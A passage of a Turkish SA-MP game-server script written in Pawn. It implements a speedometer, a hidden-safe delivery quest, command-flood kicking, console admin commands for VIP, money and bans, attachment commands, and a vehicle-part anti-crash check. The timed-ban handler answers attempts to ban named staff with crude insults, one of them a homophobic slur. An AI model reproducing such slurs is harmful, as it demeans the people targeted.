			PlayerTextDrawSetString(playerid, Speedo_Speed[playerid], Speedo_Yazi);
			PlayerTextDrawShow(playerid, Speedo_Speed[playerid]);
	    }else{
    		PlayerTextDrawHide(playerid, Speedo_Speed[playerid]);
	    }
	    return 1;
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && TextKapat[playerid] == 0)
	{
		new
			Speedo_Yazi[80],
			Float:speed_x,
			Float:speed_y,
			Float:speed_z,
			Float:Speedo_SpeedT,
			Float:Speedo_DamageT,
			Speedo_BenzinT;

		GetVehicleVelocity(GetPlayerVehicleID(playerid), speed_x, speed_y, speed_z);
		Speedo_SpeedT = floatsqroot(((speed_x * speed_x) + (speed_y * speed_y)) + (speed_z * speed_z)) * 158.179;
		PlayerTextDrawTextSize(playerid, Speedo_SpeedBar1[playerid], 539.0 + (Speedo_SpeedT * 0.264), 0.000000);
//		SetProgressBarValue(Speedo_SpeedBar[playerid], Speedo_SpeedT);
		format(Speedo_Yazi, 80, "%d KM/H", floatround(Speedo_SpeedT));
		PlayerTextDrawSetString(playerid, Speedo_Speed[playerid], Speedo_Yazi);

		GetVehicleHealth(GetPlayerVehicleID(playerid), Speedo_DamageT);
//		SetProgressBarValue(Speedo_DamageBar[playerid], float( floatround(Speedo_DamageT) ));
		PlayerTextDrawTextSize(playerid, Speedo_DamageBar1[playerid], 539.0 + (Speedo_DamageT * 0.001 * 66), 0.000000);
		format(Speedo_Yazi, 80, "%.2f", Speedo_DamageT);
		PlayerTextDrawSetString(playerid, Speedo_Damage[playerid], Speedo_Yazi);
		if(Speedo_DamageT > 750.0)
		{
			//SetProgressBarColor(Speedo_DamageBar[playerid], 0x7FFF00FF);
			PlayerTextDrawBoxColor(playerid, Speedo_DamageBar1[playerid], 0x7FFF00FF);
			PlayerTextDrawBoxColor(playerid, Speedo_DamageBar2[playerid], (0x7FFF00FF & 0xFFFFFF00) | (0x66 & ((0x7FFF00FF & 0x000000FF) / 2)));
		}

		if(Speedo_DamageT > 250.0 && Speedo_DamageT < 750.0)
		{
			//SetProgressBarColor(Speedo_DamageBar[playerid], 0xEEEE00FF);
			PlayerTextDrawBoxColor(playerid, Speedo_DamageBar1[playerid], 0xEEEE00FF);
			PlayerTextDrawBoxColor(playerid, Speedo_DamageBar2[playerid], (0xEEEE00FF & 0xFFFFFF00) | (0x66 & ((0xEEEE00FF & 0x000000FF) / 2)));
		}

		if(Speedo_DamageT < 250.0)
		{
			//SetProgressBarColor(Speedo_DamageBar[playerid], 0xEE0000FF);
			PlayerTextDrawBoxColor(playerid, Speedo_DamageBar1[playerid], 0xEE0000FF);
			PlayerTextDrawBoxColor(playerid, Speedo_DamageBar2[playerid], (0xEE0000FF & 0xFFFFFF00) | (0x66 & ((0xEE0000FF & 0x000000FF) / 2)));
		}

		Speedo_BenzinT = floatround(AVehicleData[ GetPlayerVehicleID(playerid) ][Fuel] * 0.041666);
		PlayerTextDrawTextSize(playerid, Speedo_BenzinBar1[playerid], 539.0 + (Speedo_BenzinT * 0.01 * 66), 0.000000);
//		SetProgressBarValue(Speedo_BenzinBar[playerid], float(Speedo_BenzinT));
		format(Speedo_Yazi, 80, "%%%d", Speedo_BenzinT);
		PlayerTextDrawSetString(playerid, Speedo_Benzin[playerid], Speedo_Yazi);

		PlayerTextDrawSetString(playerid, Speedo_VehName[playerid], VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ]);

		if(otovites[playerid] == 0)
		{
		    switch(PlayerGear[playerid])
		    {
		        case 1: format(Speedo_Yazi, 80, "~b~1  ~w~2  3  4  5");
		        case 2: format(Speedo_Yazi, 80, "~w~1  ~b~2  ~w~3  4  5");
		        case 3: format(Speedo_Yazi, 80, "~w~1  2  ~b~3  ~w~4  5");
		        case 4: format(Speedo_Yazi, 80, "~w~1  2  3  ~b~4  ~w~5");
		        case 5: format(Speedo_Yazi, 80, "~w~1  2  3  4  ~b~5");
		    }
			PlayerTextDrawSetString(playerid, Speedo_Vites[playerid], Speedo_Yazi);
		}else{
			PlayerTextDrawHide(playerid, Speedo_Vites[playerid]);
			PlayerTextDrawHide(playerid, Speedo_VitesI[playerid]);
		}

		ShowPlayerSpeedo(playerid);
	}else{
		HidePlayerSpeedo(playerid);
	}
	return 1;
}
*/
// ************************************************************************************************************************************************************
// Saklý Kasa Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
LoadSakliKasa()
{
	CreateDynamicMapIcon(-1087.7402,-1620.9025,76.3672, 53, 0, 0, 0, -1, 100.0, MAPICON_GLOBAL);

	new KasaYazi[128], Text3D:Kasa3D;

	for(new i; i < sizeof(SakliKasalar); i++)
	{
	    SakliKasaTrailer[i] = Vehicle_AddStatic(VehicleTrailerCargo2, SakliKasalar[i][0], SakliKasalar[i][1], SakliKasalar[i][2]+0.5, SakliKasalar[i][3], 0, 0, 120);
		TrailerSakliKasa[i] = SakliKasaTrailer[i];

		format(KasaYazi, 128, "{00FF00}Gizli Kasa %d", i);
		Kasa3D = Create3DTextLabel(KasaYazi, 0xFFFFFFFF, SakliKasalar[i][0], SakliKasalar[i][1], SakliKasalar[i][2], 10.0, 0);
		Attach3DTextLabelToVehicle(Kasa3D, SakliKasaTrailer[i], 0.0, 0.0, 0.0);
	}
}

EmptySakliKasaInfo(playerid)
{
	if(SakliKasaTamam[playerid] == 1) return 1;
	for(new i; i < sizeof(SakliKasalar); i++)
	{
	    SakliKasaAldi[playerid][i] = 0;
	}
	return 1;
}

SaveSakliKasaInfoToString(playerid)
{
	new Sonuc[100];
	for(new i; i < sizeof(SakliKasalar); i++)
	{
	    if(i < sizeof(SakliKasalar)-1)
		{
			format(Sonuc, 100, "%s%d,", Sonuc, SakliKasaAldi[playerid][i]);
		}else{
			format(Sonuc, 100, "%s%d", Sonuc, SakliKasaAldi[playerid][i]);
		}
	}

	return Sonuc;
}

LoadSakliKasaInfoFromString(playerid, string[])
{
	new BolunenBilgi[sizeof(SakliKasalar)][5];
	split(string, BolunenBilgi, ',');

	for(new i; i < sizeof(SakliKasalar); i++)
	{
	    SakliKasaAldi[playerid][i] = strval(BolunenBilgi[i]);
	}
}

UpdateSakliKasa()
{
	foreach(new playerid:Player)
	{
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) { if(SakliKasaTasiyor[playerid] == 1) { DisablePlayerCheckpoint(playerid); } SakliKasaTasiyor[playerid] = 0; continue; }
		if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) { if(SakliKasaTasiyor[playerid] == 1) { DisablePlayerCheckpoint(playerid); } SakliKasaTasiyor[playerid] = 0; continue; }

		if(SakliKasaTamam[playerid] == 1)
		{
			for(new i;i < MAX_VEHICLES;i++)
  			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid) == TrailerSakliKasa[i]))
			    {
					DetachTrailerFromVehicle( GetPlayerVehicleID(playerid) );
					SakliKasaTasiyor[playerid] = 0;
					SendClientMessage(playerid, -1, "{FF0000}Zaten bütün gizli kasalarý taþýmýþsýnýz!");
				}
			}
			continue;
		}

		ControlPlayerSakliKasa(playerid);
	}
}

ControlPlayerSakliKasa(playerid)
{
	new SakliKasaTasiyoLa;

	for(new i; i < sizeof(SakliKasalar); i++)
	{
 		if(GetVehicleTrailer( GetPlayerVehicleID(playerid) ) == SakliKasaTrailer[i])
   		{
			if(SakliKasaAldi[playerid][i] == 1)
			{
				DetachTrailerFromVehicle( GetPlayerVehicleID(playerid) );
				SakliKasaTasiyor[playerid] = 0;
				SendClientMessage(playerid, -1, "{FF0000}Zaten bu gizli kasayý ulaþtýrmýþsýnýz. Diðer gizli kasalarý taþýyýn.");
				break;
			}

			if(APlayerData[playerid][JobStarted] == true)
			{
				DetachTrailerFromVehicle( GetPlayerVehicleID(playerid) );
				SakliKasaTasiyor[playerid] = 0;
				SendClientMessage(playerid, -1, "{FF0000}Görev sýrasýnda gizli kasa taþýyamazsýnýz!");
				continue;
			}

            SakliKasaTasiyoLa = 1;

			if(SakliKasaTasiyor[playerid] == 0)
			{
   				SakliKasaTasiyor[playerid] = 1;
		    	SendClientMessage(playerid, -1, "{00FF00}Gizli kasa taþýmaya baþladýnýz. Kasayý haritadaki damalý bayrak sembolüne taþýyýn.");
				SetPlayerCheckpoint(playerid, -1087.7402,-1620.9025,76.3672,15.0);
				new gizlikasabilgi[255];
				format(gizlikasabilgi,sizeof(gizlikasabilgi),"{00FF00} Týrcý {FF0000} %s {00FF00}, Bir Gizli Kasa Buldu.",GetName(playerid));
				SendClientMessageToAll(-1,gizlikasabilgi);
				break;
			}
	   }
	}

	if(SakliKasaTasiyoLa == 0)
	{
		if(SakliKasaTasiyor[playerid] == 1) { DisablePlayerCheckpoint(playerid); }
		SakliKasaTasiyor[playerid] = 0;
	}
}

SakliKasaEnterCheckpoint(playerid)
{
	if(SakliKasaTasiyor[playerid] == 0) return 0;
    new AldiSaydi;

	for(new i; i < sizeof(SakliKasalar); i++)
	{
	    if(SakliKasaAldi[playerid][i] == 0)
	    {
			if(GetVehicleTrailer( GetPlayerVehicleID(playerid) ) == SakliKasaTrailer[i])
			{
                DetachTrailerFromVehicle( GetPlayerVehicleID(playerid) );
                SetVehicleToRespawn(SakliKasaTrailer[i]);
		    	SakliKasaAldi[playerid][i] = 1;
		    	DisablePlayerCheckpoint(playerid);
		    	AldiSaydi++;
			}
		}else{
		    AldiSaydi++;
		}
	}

	new Yazi[128];

	if(AldiSaydi == sizeof(SakliKasalar))
	{
		format(Yazi, 128, "{FFCC00}» {FFFFFF}%d {DDDDDD}gizli kasanýn tamamýný taþýdýnýz. Ödülünüz: {4867FF}1.000.000$ ve 100 Skor", sizeof(SakliKasalar));
		SendClientMessage(playerid, -1, Yazi);
		RewardPlayer(playerid, 1000000, 100);
		SakliKasaTamam[playerid] = 1;
	}else{
	    format(Yazi, 128, "{DDDDDD}Bir gizli kasa daha taþýdýnýz. {ADFF2F}5.000$ ve 5 Skor {DDDDDD}kazandýnýz. {4867FF}[ Aþama %d / %d ]", AldiSaydi, sizeof(SakliKasalar));
		SendClientMessage(playerid, -1, Yazi);
		RewardPlayer(playerid, 5000, 5);
	}
	return 1;
}

GetToplanilanGizliKasa(playerid)
{
	new AldiSaydi;
	for(new i; i < sizeof(SakliKasalar); i++)
	{
	    if(SakliKasaAldi[playerid][i] == 1)
	    {
		    AldiSaydi++;
		}
	}
	return AldiSaydi;
}

// ************************************************************************************************************************************************************
// Anti Flood Sistemi [ EvoturK ] + Anti Crasher
// ************************************************************************************************************************************************************
KomutAMK(playerid)
{
	SetTimerEx("KomutAMK_", 2000, false, "i", playerid);
}

forward KomutAMK_(playerid);
public KomutAMK_(playerid)
{
	KomutDurdur[playerid] = 0;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	new Yazi[250];
	if(KomutDurdur[playerid] == 1)
	{
	    YazilanKomut[playerid]++;
	    if(YazilanKomut[playerid] == 13)
	    {
	        format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Komut Floodu )", GetName(playerid));
			SendClientMessageToAll(-1, Yazi);

			printf("[KICK] %s(%d) ( CMD Flood )", GetName(playerid), playerid);
			SafeKick(playerid);
			return 1;
	    }
	}else{
	    YazilanKomut[playerid] = 1;
	}
	KomutDurdur[playerid] = 1;
	KomutAMK(playerid);

	format(Yazi, 250, "[CMD] %s(%d) => %s", GetName(playerid), playerid, cmdtext);
	LOG(Yazi);
	/*
	new YeniKomutTick = GetTickCount();
	if(YeniKomutTick - SonKomutTick[playerid] < 2000)
	{
	    YazilanKomut[playerid]++;
	    if(YazilanKomut[playerid] == 13)
	    {
	        new Yazi[250];
	        format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Komut Floodu )", GetName(playerid));
			SendClientMessageToAll(-1, Yazi);

			printf("[KICK] %s(%d) ( CMD Flood )", GetName(playerid), playerid);
			SafeKick(playerid);
			return 1;
	    }
	}else{
	    YazilanKomut[playerid] = 1;
	}

	SonKomutTick[playerid] = YeniKomutTick;
	*/

	printf("[CMD] %s(%d) : %s", GetName(playerid), playerid, cmdtext);
	if(!success) { SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Geçersiz komut! Yardým almak için {FFCC00}/yardim"); }
	return 1;
}

public OnRconCommand(cmd[])
{
	new tmp[128], idx;
	tmp = strtok(cmd, idx);

    if(!strcmp(tmp, "setvip", true))
    {
	new msg[128];
	tmp = strtok(cmd, idx);
	if(!strlen(tmp)) return print("Kullaným: /setvip (Oyuncu ID) (VIP Süresi)");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return print("Bu ID'de bir oyuncu yok!");

	tmp = strtok(cmd, idx);
	if(!strlen(tmp)) return print("Kullaným: /setvip (Oyuncu ID) (VIP Süresi)");
	new vipgun = strval(tmp);

	new year, month, day, hour, minute, second, VIPBitT[20];
	getdate(year, month, day);
	gettime(hour, minute, second);
	#pragma unused minute
	#pragma unused second
	format(VIPBitT, 20, GunEkle(vipgun, day, month, year));
	format(VIPBitis[id], 20, "%s.%d", VIPBitT, hour);

	format(msg, 128, "{00FF00}KONSOL, %s{F8F8FF}'in VIP üyelik süresini {00FF00}%d gün {F8F8FF}yaptý. Bitiþ: {00FF00}%d.%d.%d Saat %d:00",  GetName(id), vipgun, day, month, year, hour);
	SendClientMessageToAll(-1, msg);
	format(msg, 128, "KONSOL, %s 'in VIP üyelik süresini %d gün yaptý. Bitiþ: %d.%d.%d Saat %d:00",  GetName(id), vipgun, day, month, year, hour);
	printf(msg);

	format(msg, 128, "Konsol > %s'e %d gün VIP verdi. Bitiþ: %s", GetName(id), vipgun, VIPBitis[id]);
	LOG(msg);
	return 1;
    }


    if(!strcmp(tmp, "vipgor", true))
    {
	tmp = strtok(cmd, idx);
	if(!strlen(tmp)) return print("Kullaným: vipgor (Oyuncu ID)");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return print("Bu ID'de bir oyuncu yok!");
	if(VIP[id] == 0) return print("Bu oyuncu VIP deðil!");

	new year, month, day, hour, VBParca[4][10];
	split(VIPBitis[id], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);

	format(tmp, 128, "%s(%d) 'in VIP üyelik bitiþ gün ve saati: %d.%d.%d Saat %d.00", GetName(id), id, day, month, year, hour);
	printf(tmp);
	return 1;
	}

	    if(!strcmp(tmp, "skorver", true))
    {
        new OtherName[24], Msg[128];
		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: skorver (Oyuncu ID) (Skor)");
		new OtherPlayer = strval(tmp);
		if(!IsPlayerConnected(OtherPlayer)) return print("That player isn't online");

		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: skorver (Oyuncu ID) (Skor)");
		new pScore = strval(tmp);

		GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));

		// Set the other player's score
		RewardPlayer(OtherPlayer, 0, pScore);
		// Let the other player know that his score has been changed
		format(Msg, 128, "{00FF00}Size KONSOL tarafýndan{FFFF00}%i{00FF00} skor verildi. Gönderen ADMIN {FFFF00}KONSOL", pScore);
		SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
		// Let the player know he has set the score of the other player
		format(Msg, 128, "%s 'a %i skor verdiniz.", OtherName, pScore);
		printf(Msg);
	return 1;
	}

		    if(!strcmp(tmp, "paraver", true))
    {
	// Setup local variables
	new Msg[128], OtherName[24], OtherPlayer, Money;
		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: paraver (Oyuncu ID) (Para)");
		OtherPlayer = strval(tmp);
		if(!IsPlayerConnected(OtherPlayer)) return print("That player isn't online");

		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: paraver (Oyuncu ID) (Para)");
		Money = strval(tmp);

				GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));

						// Transfer the money
						RewardPlayer(OtherPlayer, Money, 0);
						// Let the other player know that he has received money
						format(Msg, 128, "{00FF00} $%i {ffffff} kadar para size {00FF00} KONSOL {FFFF00} tarafýndan gönderildi.", Money);
						SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
						format(Msg, 128, "{00FF00} KONSOL {FFFFFF} tarafýndan %s adlý kiþiye{00FF00} $%i {ffffff} kadar para gönderildi.", OtherName,Money);
						SendClientMessageToAll(0xFFFFFFFF, Msg);
						// Let the player know he gave money to somebody else
						format(Msg, 128, "Siz $%i Degerindeki parayi  %s adlý oyuncuya gonderdiniz.", Money, OtherName);
						printf(Msg);

						format(Msg, 128, "Konsol > %s(%d)'a %d$ para gönderdi",  GetName(OtherPlayer), OtherPlayer, Money);
						LOG(Msg);
						Oyuncu_Kaydet(OtherPlayer);



	// Let the server know that this was a valid command
	return 1;
}

	if(!strcmp(tmp, "getid", true))
{
    new found, string[128], playername[MAX_PLAYER_NAME];
    tmp = strtok(cmd, idx);
    if(isnull(tmp)) return print("Kullanis: getid [isim] ");
    format(string,sizeof(string),"Aranan Oyuncu: \"%s\"",tmp);
    printf(string);
    for(new i=0; i <= MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
            GetPlayerName(i, playername, MAX_PLAYER_NAME);
            new namelen = strlen(playername);
            new bool:searched=false;
            for(new pos=0; pos <= namelen; pos++)
            {
                if(searched != true)
                {
                    if(strfind(playername,tmp,true) == pos)
                    {
                        found++;
                        format(string,sizeof(string),"%d. %s (ID: %d)",found,playername,i);
                        printf(string);
                        searched = true;
                    }
                }
            }
        }
    }
    if(found == 0) print("Böyle bir Oyuncu bulunamadi!");
    return 1;
}
if(!strcmp(cmd, "cban", true))
{
	new PlayerToBan, Gun, Saat, Reason[128], Yazi[1000], panel[24];

		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: cban [ Oyuncu ID ][ Gün ][ Saat ][ Sebep ]");
		PlayerToBan = strval(tmp);
		if(!IsPlayerConnected(PlayerToBan)) return print("That player isn't online");

		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: cban [ Oyuncu ID/Nick ][ Gün ][ Saat ][ Sebep ]");
		Gun = strval(tmp);

		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: cban [ Oyuncu ID/Nick ][ Gün ][ Saat ][ Sebep ]");
		Saat = strval(tmp);

		tmp = strtok(cmd, idx);
		if(!strlen(tmp)) return print("Kullaným: cban [ Oyuncu ID/Nick ][ Gün ][ Saat ][ Sebep ]");
		format(Reason, 128, tmp);

					if(Gun < 0 || Saat < 0) return print("Gün ve saati 0'ýn altýnda bir deðer giremezsiniz!");
   				    if(IsPlayerNPC(PlayerToBan)) return print("NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return print("Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return print("Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
					if(!strcmp("Tiger", GetName(PlayerToBan), true)) return print("Arda Hoca'yý sen kim oluyon da banlýyon ibine!");

					new minute, second;
					getdate(year, month, day);
					gettime(hour, minute, second);
					#pragma unused second
					hour += Saat;
					if(hour >= 24)
					{
					    hour -= 24;
						day++;
					}
					day += Gun;
					AyKontrol(day, month, year);
					new Yazi2[1024];
					format(Yazi, 1000, "{FF0000}KONSOL %s{F8F8FF}'yi %i gün %i Saat banladý {FF0000}[ %s ]",  GetName(PlayerToBan), Gun, Saat, Reason);
					SendClientMessageToAll(0x808080FF, Yazi);
					format(Yazi, 1000, "KONSOL %s'yi %i gün %i Saat banladý [ %s ]",  GetName(PlayerToBan), Gun, Saat, Reason);
					printf(Yazi);
					format(Yazi2, 1000, "~r~~h~KONSOL %s~w~'yI %i gun %i Saat banladI ~r~~h~( %s )", GetName(PlayerToBan), Gun, Saat, Reason);
					SendDuyuruText(Yazi2);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}KONSOL\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Reason);
					format(Yazi, 1000, "%s{DDDDDD}Süre: {48D1CC}%d Gün %d Saat\n", Yazi, Gun, Saat);
					format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, day, month, year, hour, minute);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");
					format(panel, 1000, "PANEL");
					new handle = SQL::Open(SQL::INSERT, "yasaklilar");
    				SQL::WriteString(handle, "Nick", GetName(PlayerToBan));
    				SQL::WriteString(handle, "Banlayan", panel);
    				SQL::WriteString(handle, "Sebep", Reason);
    				SQL::WriteInt(handle, "Sonlu", 1);
    				SQL::WriteInt(handle, "BitisGun", day);
    				SQL::WriteInt(handle, "BitisAy", month);
    				SQL::WriteInt(handle, "BitisYil", year);
    				SQL::WriteInt(handle, "BitisSaat", hour);
    				SQL::WriteInt(handle, "BitisDakika", minute);
   					SQL::Close(handle);

					format(Yazi, 1000, "[BAN] PANEL %s(%d)'i %d gün %d saat banladý. Sebep: %s", GetName(PlayerToBan), PlayerToBan, Gun, Saat, Reason);
					LOG(Yazi);

					format(Yazi, 1000, "[BAN] PANEL %s(%d)'i %d gün %d saat banladý. Sebep: %s",  GetName(PlayerToBan), PlayerToBan, Gun, Saat, Reason);
					BANLOG(Yazi);

					SafeKick(PlayerToBan);
	return 1;
}
if(!strcmp(tmp, "unban", true))
{
	new AcilacakBan[30];
	tmp = strtok(cmd, idx);
	if (!strlen(tmp)) return print("Kullaným: unban [ Oyuncu Nick ]");
	format(AcilacakBan, 30, tmp);
    if(!SQL::RowExistsEx("yasaklilar", "Nick", AcilacakBan)) return print("Bu kiþi yasaklýlar listesinde yok!");

	new Yazi[300];
	format(Yazi, 300, "{FF0000}KONSOL, %s{F8F8FF}'in yasaðýný kaldýrdý.",  AcilacakBan);
	SendClientMessageToAll(-1, Yazi);
		format(Yazi, 300, "KONSOL, %s'in yasaðýný kaldýrdý.",  AcilacakBan);
	printf(Yazi);

	UnBan(AcilacakBan);
	return 1;
}

    return 0;
}
public OnPlayerCommandText(playerid, cmdtext[])
{
    // Bu ne amk
    if (strcmp("/attachcmds", cmdtext, true, 10) == 0)
        {
        SendClientMessage(playerid, 0x00FF00FF, "attachemts system by MORJAN1122");
                SendClientMessage(playerid, 0x00FF00FF, "/attach1-10 and to remove it type /removeattach");
                return 1;
        }
        if (strcmp("/removeattach", cmdtext, true, 10) == 0) // remove attachments
    {
        for(new i=0; i<MAX_PLAYER_ATTACHED_OBJECTS; i++)
        {
            if(IsPlayerAttachedObjectSlotUsed(playerid, i)) RemovePlayerAttachedObject(playerid, i);
        }
        return 1;
    }
        if (strcmp("/dick", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 1, 19086, 8, -0.049768, -0.014062, -0.108385, 87.458297, 263.478149, 184.123764, 0.622413, 1.041609, 1.012785 );
                return 1;
        }
        if (strcmp("/attach1", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 19315, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach2", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 19320, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach3", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 1609, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach4", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 1550, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach5", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 3524, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach6", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 2770, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach7", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 19346, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }

    if (strcmp("/attach8", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 19471, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach9", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 19308, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }
        if (strcmp("/attach10", cmdtext, true, 10) == 0)
        {
                SetPlayerAttachedObject(playerid, 2, 905, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1, 0xFF00FF00);
                return 1;
        }



        return 0;
}

CMD:modcontrol(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 5 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu kullanmaya yetkiniz bulunmuyor.");

	new Yazi[150];
	format(Yazi, 150, "{00FF00}%s {F8F8FF}adlý yönetici crash yapan araçlarý temizledi", GetName(playerid));
	SendClientMessageToAll(-1, Yazi);

	for(new i; i < MAX_VEHICLES; i++)
	{
	    if(GetVehicleModel(i) != 0)
	    {
	        ModControl(i);
	    }
	}
	return 1;
}

ModControl(vehicleid)
{
	for(new i; i < 14; i++)
	{
		if(!IsComponentidCompatible(GetVehicleModel(vehicleid), GetVehicleComponentInSlot(vehicleid, i))) RemoveVehicleComponent(vehicleid, GetVehicleComponentInSlot(vehicleid, i));
	}
}

AllVehicleModControl()
{
	for(new i; i < MAX_VEHICLES; i++)
	{
	    if(GetVehicleModel(i) != 0)
	    {
	        ModControl(i);
	    }
	}
}

stock IsComponentidCompatible(modelid, componentid)
{
    if(componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
         componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
         componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
         componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086)
         return true;

    switch (modelid)
    {
        case 400: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 401: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 402: return (componentid == 1009 || componentid == 1009 || componentid == 1010);
        case 404: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 405: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000);
        case 409: return (componentid == 1009);
        case 410: return (componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 411: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 412: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 415: return (componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 418: return (componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016);
        case 419: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 420: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003);
